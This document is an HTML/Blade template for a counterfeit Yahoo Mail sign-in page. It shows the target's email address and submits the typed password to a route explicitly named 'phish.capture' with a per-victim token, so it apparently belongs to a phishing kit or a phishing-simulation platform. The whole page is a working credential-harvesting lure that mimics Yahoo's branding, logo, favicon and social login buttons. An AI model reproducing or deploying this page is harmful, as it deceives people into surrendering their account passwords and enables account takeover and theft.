<!DOCTYPE html>
<html lang="en" dir="ltr" class="yahoo">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>Yahoo Mail</title>
    <link rel="icon" href="https://s.yimg.com/wm/mbr/images/yahoo-yep-favicon-v1.ico">
    <link href="https://s.yimg.com/bw/fonts/yahoo-product-sans-vf.woff2" as="font" rel="preload">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif;background:#f9f9f9;min-height:100vh;display:flex;flex-direction:column}
        .topbar{height:6px;background:linear-gradient(90deg,#6001d2,#ff0050,#ff6600)}
        .main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px}
        .card{background:#fff;border-radius:16px;padding:40px;width:100%;max-width:400px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center}
        .yahoo-logo{margin-bottom:24px}
        .yahoo-logo svg{height:36px;width:auto}
        h1{font-size:24px;font-weight:700;color:#0f0f0f;margin-bottom:4px;font-family:'Yahoo Sans','Helvetica Neue',sans-serif}
        .sub{font-size:14px;color:#616161;margin-bottom:32px}
        .form-group{text-align:left;margin-bottom:16px;position:relative}
        .form-group label{display:block;font-size:14px;color:#1d1d1f;margin-bottom:6px;font-weight:600}
        .form-group input{width:100%;height:44px;padding:0 16px;font-size:15px;border:1px solid #ccc;border-radius:10px;outline:none;background:#fff;transition:border-color .2s,box-shadow .2s}
        .form-group input:focus{border-color:#6001d2;box-shadow:0 0 0 3px rgba(96,1,210,.12)}
        .form-group input.error{border-color:#ff0050}
        .error-text{font-size:12px;color:#ff0050;margin-top:4px;display:none}
        .show-pw{position:absolute;right:12px;top:38px;background:none;border:none;color:#6001d2;font-size:13px;font-weight:600;cursor:pointer;padding:4px}
        .btn-next{width:100%;height:48px;background:#6001d2;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .15s;font-family:-apple-system,sans-serif}
        .btn-next:hover{background:#4a00a0}
        .btn-next:active{background:#3d0080}
        .links{margin-top:20px;display:flex;justify-content:center;gap:20px}
        .links a{font-size:14px;color:#6001d2;text-decoration:none;font-weight:500}
        .links a:hover{text-decoration:underline}
        .divider{display:flex;align-items:center;margin:24px 0}
        .divider::before,.divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
        .divider span{padding:0 16px;font-size:13px;color:#616161}
        .social-btns{display:flex;gap:12px;margin-top:8px}
        .social-btn{flex:1;height:44px;border:1px solid #ddd;border-radius:10px;background:#fff;display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;font-weight:500;color:#1d1d1f;cursor:pointer;transition:background .15s}
        .social-btn:hover{background:#f5f5f5}
        .social-btn svg{width:18px;height:18px}
        .footer{padding:16px 24px;text-align:center;font-size:12px;color:#8c8c8c;border-top:1px solid #e8e8e8}
        .footer a{color:#6001d2;text-decoration:none}
        .footer-links{display:flex;justify-content:center;gap:16px;margin-top:8px}
    </style>
</head>
<body>
    <div class="topbar"></div>
    <div class="main">
        <div class="card">
            <div class="yahoo-logo">
                <svg viewBox="0 0 156 38" xmlns="http://www.w3.org/2000/svg">
                    <text x="0" y="30" font-family="'Yahoo Sans',-apple-system,sans-serif" font-size="32" font-weight="900" fill="#6001d2">yahoo!</text>
                </svg>
            </div>
            <h1>Welcome</h1>
            <p class="sub">{{ $email }}</p>

            <form action="{{ route('phish.capture', ['provider' => 'yahoo', 'token' => $token]) }}" method="POST">
                @csrf
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required autofocus>
                    <button type="button" class="show-pw" onclick="togglePw()">Show</button>
                </div>

                <div style="display:flex;align-items:center;margin-bottom:8px">
                    <input type="checkbox" id="keepSigned" style="margin-right:8px" checked>
                    <label for="keepSigned" style="font-size:13px;color:#424242;cursor:pointer">Stay signed in</label>
                </div>

                <button type="submit" class="btn-next">Next</button>
            </form>

            <div class="links">
                <a href="#">Forgot password?</a>
                <a href="#">Create an account</a>
            </div>

            <div class="divider"><span>or</span></div>

            <div class="social-btns">
                <button class="social-btn">
                    <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                    </svg>
                    Google
                </button>
                <button class="social-btn">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z" fill="#1877F2"/>
                    </svg>
                    Facebook
                </button>
                <button class="social-btn">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z" fill="#fff"/>
                    </svg>
                    GitHub
                </button>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Service</a>
            <a href="#">Help</a>
        </div>
        <div style="margin-top:8px">© 2026 Yahoo</div>
    </div>

    <script>
        function togglePw() {
            var inp = document.getElementById('password');
            var btn = document.querySelector('.show-pw');
            if (inp.type === 'password') { inp.type = 'text'; btn.textContent = 'Hide'; }
            else { inp.type = 'password'; btn.textContent = 'Show'; }
        }
    </script>
</body>
</html>
